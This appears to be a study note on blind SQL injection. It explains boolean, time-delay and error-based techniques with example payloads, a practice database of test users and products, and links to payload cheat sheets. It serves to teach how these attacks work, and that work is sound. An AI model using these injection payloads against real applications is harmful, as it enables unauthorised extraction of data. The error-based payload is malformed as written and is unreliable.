Blind SQL injection can be tricky. 

The target application is vulnerable to SQL injection however, the response does not contain the results of the query. This is important to note. The response does not contain the results of the query.

UNION attacks become ineffective as we rely on seeing the results. Instead, we can use conditional responses to extract information.

Boolean-based Blind SQLi

' AND 1=1 -- - 
' AND 1=2 -- - 

- The 1=1 is always true, so if the application response normally, it indicates the injection was successful.
- To test for Blind SQLi we change 1=1 to 1=2. If the response changes, it suggests the application might be vulnerable.

This is important to note because if providing a true statement the database will return back information, if we provide it a false statement the application might behave differently, either remove things from the results, add more information to the response, the point of this is to see how the application reacts and this proves we can ask it YES or NO : TRUE OR FLASE questions.

Time-based Blind SQLi

SELECT SLEEP(10)

Here, sleep(10) forces the database to wait for 10 seconds if the condition is true. If the response from the application is delayed by about 10 seconds, it indicates the injection worked.

Error-based BlindSQLi

' OR (SELECT CASE WHEN (ASCII(SUBSTRING((SELECT database(),1,1)) = 'a) THEN CAST(' AS INT) ELSE 'a) END) -- ';

Here, we're using the CASE statement to test a condition in the database. If the condition is true, an error is forced by trying to cast an empty string to an integer, which is not possible and causes a database error. If the condition is false, the query returns 'a', which does not cause an error. 

We can iterate over this process, adjusting the condition each time to extract information character by character from the database in a blind scenario where the error acts as a Boolean flag.

The point of this, is to be able to see how the web application handles errors through the SQL statement. If the application accepts the error and throws it back at us, we can extract information from the Error and see how we can proceed from there. If the application does not return anything we move on. This is essentially the same as asking True or False questions because we are seeing if the web application accepts the SQL statement and if the error is TRUE then it throws us an error.

Understanding SQLi Payloads: 
[https://www.db-fiddle.com/f/nLpyQDMd49iRygnY9H7CB8/5](https://www.db-fiddle.com/f/nLpyQDMd49iRygnY9H7CB8/5)

In the link above we see the SQL code:
```sql
-- Create a `users` table
CREATE TABLE `users` (
  `id` int NOT NULL AUTO_INCREMENT,
  `username` varchar(50) NOT NULL,
  `password` varchar(50) NOT NULL,
  `role` varchar(20) NOT NULL,
  PRIMARY KEY (`id`)
);

-- Insert test data into `users`
INSERT INTO `users` (`username`, `password`, `role`) VALUES
('Jessamy', 'password123', 'admin'),
('Jeremy', 'qwerty', 'user');

-- Create a `products` table
CREATE TABLE `products` (
  `id` int NOT NULL AUTO_INCREMENT,
  `name` varchar(100) NOT NULL,
  `description` text,
  `price` decimal(10, 2) NOT NULL,
  PRIMARY KEY (`id`)
);

-- Insert test data into `products`
INSERT INTO `products` (`name`, `description`, `price`) VALUES
('Laptop', '15-inch laptop with 8GB RAM', 1200.00),
('Smartphone', 'Latest model with 5.7-inch screen', 299.99),
('Coffee Maker', 'Brews coffee and has a timer', 49.99);

```


SQL Query for the Code above:
```sql
-- Simple SQL statements
-- SELECT * FROM users;
-- SELECT * FROM users WHERE username = 'Jessamy';
-- SELECT * FROM users WHERE username = 'Jessamy' and password = 'password123';
-- SELECT * FROM users WHERE username = 'Jessamy'-- ' and password = 'password123';
--

-- Substring
-- SELECT database()
-- SELECT substring(database(),1,1)

-- Booleans
-- SELECT * FROM products WHERE name = 'Laptop' AND 1=1;
-- SELECT * FROM products WHERE name = 'Laptop' AND 1=2;

-- Time delays
-- SELECT * FROM products WHERE name = 'Laptop' AND SLEEP(5);

-- Time delay substring
-- SELECT database()
-- SELECT IF(1=1,SLEEP(5),'a')
-- SELECT IF(SUBSTRING((SELECT database()),1,1)='a',SLEEP(5),'a')
-- SELECT IF(SUBSTRING((SELECT database()),1,1)='t',SLEEP(5),'a')
-- SELECT * FROM products WHERE name = 'Laptop' AND IF(1=1,SLEEP(5),'a')

-- Errors
-- SELECT IF(SUBSTRING((SELECT database()),1,1)='a',(SELECT table_name FROM information_schema.tables),'a')
-- SELECT IF(SUBSTRING((SELECT database()),1,1)='t',(SELECT table_name FROM information_schema.tables),'a')
```


Scripting Solutions for Blind SQLi

Tools vs Custom Scripts for Blind SQLi

- Tools tend to lead to a faster workflow
- Scripts can be more precise or customisable
- Scripts can help you develop your skills and understanding of an attack
- There are not many cases that warrant custom scripts

Payload Cheatsheet:
https://portswigger.net/web-security/sql-injection/cheat-sheet
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection

